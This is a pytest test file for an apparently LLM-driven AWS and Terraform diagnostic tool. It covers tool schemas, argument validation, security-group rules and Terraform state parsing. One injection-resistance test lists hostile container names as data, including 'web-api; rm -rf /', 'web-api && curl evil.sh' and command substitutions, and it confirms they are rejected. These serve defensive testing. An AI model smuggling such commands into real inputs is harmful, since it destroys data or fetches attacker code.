"""Tool contract, schema validity, injection resistance and state parsing."""

from __future__ import annotations

import json

import pytest

from tfmedic.config import Settings
from tfmedic.providers import CommandResult
from tfmedic.tools.aws_ec2 import (
    AuthorizeSecurityGroupIngressArgs,
    AuthorizeSecurityGroupIngressTool,
    DescribeEc2InstanceTool,
    DescribeSecurityGroupsTool,
)
from tfmedic.tools.aws_ssm import (
    RunSsmDiagnosticArgs,
    SsmDiagnostic,
    build_diagnostic_commands,
)
from tfmedic.tools.base import ToolResult
from tfmedic.tools.registry import ToolRegistry, build_default_registry
from tfmedic.tools.terraform import ReadTerraformStateTool, TerraformStateReader

from .conftest import FakeAwsClientFactory, FakeCommandRunner, FakeReadTool, FakeWriteTool

# --------------------------------------------------------------------------- #
# Registry and schema
# --------------------------------------------------------------------------- #


def test_default_registry_partitions_read_and_write_tools():
    registry = build_default_registry(
        Settings(), FakeAwsClientFactory(), runner=FakeCommandRunner()
    )
    write_names = {tool.name for tool in registry.write_tools()}
    assert write_names == {
        "authorize_security_group_ingress",
        "restart_docker_container",
        "restart_systemd_service",
        "reboot_ec2_instance",
    }
    assert len(registry.read_tools()) == len(registry) - len(write_names)


def test_every_tool_exposes_a_valid_openai_schema():
    registry = build_default_registry(
        Settings(), FakeAwsClientFactory(), runner=FakeCommandRunner()
    )
    for schema in registry.schemas():
        assert schema["type"] == "function"
        function = schema["function"]
        assert function["name"] and function["description"]
        assert function["parameters"]["type"] == "object"
        json.dumps(schema)  # must be serialisable for the wire


def test_duplicate_tool_registration_is_rejected():
    from tfmedic.exceptions import ToolExecutionError

    registry = ToolRegistry([FakeReadTool()])
    with pytest.raises(ToolExecutionError):
        registry.register(FakeReadTool())


def test_write_flag_is_a_class_constant_not_runtime_state():
    assert FakeWriteTool.is_write_operation is True
    assert FakeReadTool.is_write_operation is False
    assert AuthorizeSecurityGroupIngressTool.is_write_operation is True


# --------------------------------------------------------------------------- #
# Argument validation / injection resistance
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "container",
    ["web-api; rm -rf /", "web-api && curl evil.sh", "$(whoami)", "web api", "`id`"],
)
def test_ssm_rejects_shell_metacharacters_in_names(container):
    with pytest.raises(ValueError):
        RunSsmDiagnosticArgs(
            instance_id="i-09a8b7c6d",
            diagnostic=SsmDiagnostic.DOCKER_LOGS,
            container=container,
        )


def test_ssm_requires_the_parameters_each_diagnostic_needs():
    with pytest.raises(ValueError):
        RunSsmDiagnosticArgs(instance_id="i-09a8b7c6d", diagnostic=SsmDiagnostic.DOCKER_LOGS)
    with pytest.raises(ValueError):
        RunSsmDiagnosticArgs(
            instance_id="i-09a8b7c6d", diagnostic=SsmDiagnostic.TCP_CONNECTIVITY, host="db.internal"
        )


def test_ssm_commands_are_built_deterministically():
    args = RunSsmDiagnosticArgs(
        instance_id="i-09a8b7c6d",
        diagnostic=SsmDiagnostic.DOCKER_LOGS,
        container="web-api",
        tail_lines=100,
    )
    commands = build_diagnostic_commands(args)
    assert commands == ["docker logs --tail 100 --timestamps web-api 2>&1 | tail -100"]


def test_tcp_connectivity_probe_is_bounded_and_explicit():
    args = RunSsmDiagnosticArgs(
        instance_id="i-09a8b7c6d",
        diagnostic=SsmDiagnostic.TCP_CONNECTIVITY,
        host="postgres-prod.internal",
        port=5432,
    )
    command = build_diagnostic_commands(args)[0]
    assert command.startswith("timeout 5 ")
    assert "TCP_BLOCKED" in command


def test_invalid_instance_id_is_rejected_before_any_sdk_call():
    tool = DescribeEc2InstanceTool(FakeAwsClientFactory())
    result = tool.execute({"instance_id": "not-an-instance"})
    assert result.ok is False
    assert "instance_id" in (result.error or "")


def test_ingress_rule_refuses_to_open_a_database_port_to_the_world():
    with pytest.raises(ValueError, match="0.0.0.0/0"):
        AuthorizeSecurityGroupIngressArgs(
            group_id="sg-0418c39f", from_port=5432, to_port=5432, cidr_ip="0.0.0.0/0"
        )


def test_ingress_rule_requires_exactly_one_source():
    with pytest.raises(ValueError):
        AuthorizeSecurityGroupIngressArgs(group_id="sg-0418c39f", from_port=5432, to_port=5432)
    with pytest.raises(ValueError):
        AuthorizeSecurityGroupIngressArgs(
            group_id="sg-0418c39f",
            from_port=5432,
            to_port=5432,
            cidr_ip="10.0.1.0/24",
            source_security_group_id="sg-0999aaaa",
        )


# --------------------------------------------------------------------------- #
# Behaviour against canned AWS responses
# --------------------------------------------------------------------------- #


def test_describe_instance_correlates_subnet_topology():
    aws = FakeAwsClientFactory(
        {
            "ec2.describe_instances": {
                "Reservations": [
                    {
                        "Instances": [
                            {
                                "InstanceId": "i-09a8b7c6d",
                                "State": {"Name": "running"},
                                "InstanceType": "t3.small",
                                "Placement": {"AvailabilityZone": "us-east-1a"},
                                "PrivateIpAddress": "10.0.1.50",
                                "VpcId": "vpc-0abc1234",
                                "SubnetId": "subnet-0web1234",
                                "SecurityGroups": [
                                    {"GroupId": "sg-0web1111", "GroupName": "web-sg"}
                                ],
                                "Tags": [{"Key": "Name", "Value": "web-api"}],
                            }
                        ]
                    }
                ]
            },
            "ec2.describe_instance_status": {
                "InstanceStatuses": [
                    {
                        "SystemStatus": {"Status": "ok"},
                        "InstanceStatus": {"Status": "ok"},
                    }
                ]
            },
            "ec2.describe_subnets": {"Subnets": [{"CidrBlock": "10.0.1.0/24"}]},
        }
    )
    result = DescribeEc2InstanceTool(aws).execute({"instance_id": "i-09a8b7c6d"})
    assert result.ok is True
    assert result.data["subnet_cidr"] == "10.0.1.0/24"
    assert result.data["private_ip"] == "10.0.1.50"
    assert "running" in result.summary


def test_security_group_port_filter_detects_the_missing_rule():
    aws = FakeAwsClientFactory(
        {
            "ec2.describe_security_groups": {
                "SecurityGroups": [
                    {
                        "GroupId": "sg-0418c39f",
                        "GroupName": "postgres-prod-sg",
                        "VpcId": "vpc-0abc1234",
                        "IpPermissions": [
                            {
                                "IpProtocol": "tcp",
                                "FromPort": 5432,
                                "ToPort": 5432,
                                "IpRanges": [{"CidrIp": "10.0.2.0/24"}],
                            }
                        ],
                        "IpPermissionsEgress": [],
                    }
                ]
            }
        }
    )
    result = DescribeSecurityGroupsTool(aws).execute(
        {"group_ids": ["sg-0418c39f"], "port": 5432}
    )
    assert result.ok is True
    group = result.data["security_groups"][0]
    assert group["ingress"][0]["cidr_blocks"] == ["10.0.2.0/24"]
    assert group["matches_port"] is True


def test_duplicate_ingress_rule_is_treated_as_success():
    error = Exception("duplicate")
    error.response = {"Error": {"Code": "InvalidPermission.Duplicate", "Message": "exists"}}
    aws = FakeAwsClientFactory({"ec2.authorize_security_group_ingress": error})
    result = AuthorizeSecurityGroupIngressTool(aws).execute(
        {
            "group_id": "sg-0418c39f",
            "from_port": 5432,
            "to_port": 5432,
            "cidr_ip": "10.0.1.0/24",
        }
    )
    assert result.ok is True
    assert result.data["already_existed"] is True


def test_aws_client_errors_become_structured_tool_failures():
    error = Exception("denied")
    error.response = {
        "Error": {"Code": "UnauthorizedOperation", "Message": "You are not authorized"}
    }
    aws = FakeAwsClientFactory({"ec2.describe_instances": error})
    result = DescribeEc2InstanceTool(aws).execute({"instance_id": "i-09a8b7c6d"})
    assert result.ok is False
    assert result.data["aws_error_code"] == "UnauthorizedOperation"


# --------------------------------------------------------------------------- #
# Terraform state parsing
# --------------------------------------------------------------------------- #

_STATE = {
    "terraform_version": "1.8.5",
    "values": {
        "root_module": {
            "resources": [
                {
                    "address": "aws_security_group.db_sg",
                    "mode": "managed",
                    "type": "aws_security_group",
                    "name": "db_sg",
                    "provider_name": "registry.terraform.io/hashicorp/aws",
                    "values": {"id": "sg-0418c39f", "name": "postgres-prod-sg"},
                }
            ],
            "child_modules": [
                {
                    "resources": [
                        {
                            "address": "module.network.aws_subnet.web",
                            "mode": "managed",
                            "type": "aws_subnet",
                            "name": "web",
                            "provider_name": "registry.terraform.io/hashicorp/aws",
                            "values": {"cidr_block": "10.0.1.0/24", "user_data": "x" * 5000},
                        }
                    ]
                }
            ],
        }
    },
}


def _reader(tmp_path, payload=None):
    runner = FakeCommandRunner(CommandResult(0, json.dumps(payload or _STATE), ""))
    return TerraformStateReader(runner, tmp_path), runner


def test_terraform_state_flattens_child_modules(tmp_path):
    reader, runner = _reader(tmp_path)
    addresses = {resource["address"] for resource in reader.resources()}
    assert addresses == {"aws_security_group.db_sg", "module.network.aws_subnet.web"}
    assert runner.commands[0] == ["terraform", "show", "-json"]


def test_terraform_state_is_cached_across_calls(tmp_path):
    reader, runner = _reader(tmp_path)
    reader.resources()
    reader.resources()
    assert len(runner.commands) == 1


def test_read_terraform_state_filters_and_prunes(tmp_path):
    reader, _ = _reader(tmp_path)
    result = ReadTerraformStateTool(reader).execute({"resource_type": "aws_subnet"})
    assert result.ok is True
    attributes = result.data["resources"][0]["attributes"]
    assert attributes["cidr_block"] == "10.0.1.0/24"
    assert attributes["user_data"] == "<omitted by tfmedic>"


def test_terraform_failure_surfaces_actionable_error(tmp_path):
    runner = FakeCommandRunner(CommandResult(1, "", "No state file was found!"))
    reader = TerraformStateReader(runner, tmp_path)
    result = ReadTerraformStateTool(reader).execute({})
    assert result.ok is False
    assert "No state file" in (result.error or "")


# --------------------------------------------------------------------------- #
# Result payloads
# --------------------------------------------------------------------------- #


def test_oversized_tool_payloads_are_truncated_for_the_context_window():
    result = ToolResult.success("big", blob="x" * 50_000)
    payload = json.loads(result.to_llm_payload(limit=1_000))
    assert payload["data_truncated"] is True
    assert payload["data_original_chars"] > 1_000
    assert len(payload["data"]) < 1_200
